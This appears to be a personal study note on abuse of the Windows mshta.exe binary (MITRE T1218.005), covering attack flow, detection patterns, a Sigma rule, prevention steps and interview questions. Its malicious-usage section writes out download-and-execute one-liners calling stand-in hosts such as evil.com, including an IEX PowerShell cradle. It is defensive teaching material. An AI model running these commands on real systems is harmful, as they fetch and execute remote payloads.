---
tags:
  - "#cybersecurity/malware/lolbas"
  - "#cybersecurity/blue-team/detection"
  - "#interview/concepts"
aliases:
  - mshta
  - Microsoft HTML Application Host
---

# mshta.exe

> **One-liner:** Windows binary that executes HTA files, commonly abused to run malicious VBScript/JavaScript payloads while bypassing application controls.

## 🎯 What Is It?
`mshta.exe` (Microsoft HTML Application Host) is a legitimate Windows utility located at `C:\Windows\System32\mshta.exe`. It's designed to execute [[HTA (HTML Application)]] files—HTML-based applications that run with desktop privileges outside the browser sandbox.

## 🤔 Why It Matters
- **Signed by Microsoft:** Trusted by default, bypasses many application controls
- **[[Living off the Land (LOLBAS)|LOLBAS]] Binary:** Pre-installed on all Windows systems
- **MITRE ATT&CK:** T1218.005 — Signed Binary Proxy Execution: Mshta
- **Common in attacks:** Phishing, macro-based malware, initial access

## 🔬 How It Works

### Legitimate Execution
```powershell
# Run a local HTA file
mshta.exe C:\Tools\admin_utility.hta

# Run with specific window properties
mshta.exe "about:<html><script>alert('Hello')</script></html>"
```

### Malicious Execution Patterns

| Technique | Command Example |
|-----------|-----------------|
| **Remote HTA** | `mshta.exe http://evil.com/payload.hta` |
| **Inline VBScript** | `mshta.exe vbscript:Execute("...")` |
| **Inline JavaScript** | `mshta.exe javascript:eval("...")` |
| **Base64 payload** | HTA with encoded PowerShell inside |

### Attack Flow
```
Phishing email with .hta attachment
              ↓
User double-clicks → mshta.exe launches
              ↓
VBScript in HTA creates WScript.Shell
              ↓
Spawns powershell.exe with encoded command
              ↓
Downloads & executes C2 beacon
```

## 🚨 Malicious Usage Examples

### Remote HTA Execution
```powershell
mshta.exe http://attacker.com/payload.hta
```

### Inline VBScript
```powershell
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(IWR http://evil.com/shell.ps1)"":close")
```

### JavaScript with COM Object
```powershell
mshta.exe javascript:a=GetObject("script:http://evil.com/payload.sct").Exec();close();
```

## 🛡️ Detection & Prevention

### How to Detect

#### Process Monitoring
- `mshta.exe` spawning child processes (`powershell.exe`, `cmd.exe`, `wscript.exe`)
- `mshta.exe` with URLs or encoded strings in command line
- `mshta.exe` making network connections

#### Suspicious Command-Line Patterns
```
mshta.exe http://              # Remote execution
mshta.exe vbscript:            # Inline VBScript
mshta.exe javascript:          # Inline JavaScript
mshta.exe *FromBase64*         # Encoded payloads
```

### Sigma Rule
```yaml
title: Mshta Suspicious Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith: '\mshta.exe'
  selection_child:
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\cscript.exe'
  condition: selection_parent and selection_child
level: high
```

### Sysmon Event ID 1 (Process Creation)
Look for:
- `ParentImage` = `mshta.exe`
- `CommandLine` containing URLs, `vbscript:`, `javascript:`

### How to Prevent
- **Application Control:** Block `mshta.exe` for standard users
- **ASR Rules:** Enable "Block executable content from email client and webmail"
- **Email Gateway:** Strip/block `.hta` attachments
- **GPO:** Disable file association for `.hta` extension

## 🎤 Interview Angles

### Common Questions
- "What is mshta.exe and why is it abused by attackers?"
- "How would you detect malicious mshta.exe execution?"
- "What's the difference between mshta.exe and wscript.exe?"

### STAR Story
> **Situation:** SIEM alert triggered on mshta.exe spawning powershell.exe with Base64-encoded arguments.
> **Task:** Investigate the alert and determine if the host was compromised.
> **Action:** Decoded the Base64 payload revealing a Cobalt Strike stager. Traced the initial vector to a phishing email with an HTA attachment. Isolated the host and performed memory forensics.
> **Result:** Identified the C2 channel, blocked the infrastructure, and prevented lateral movement. Added detection for this specific HTA pattern.

## 🔗 Related Concepts
- [[HTA (HTML Application)]]
- [[Living off the Land (LOLBAS)]]
- [[Command and Control (C2)]]
- [[Phishing]]
- [[Static Analysis]]

## 📚 References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- LOLBAS - mshta.exe: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
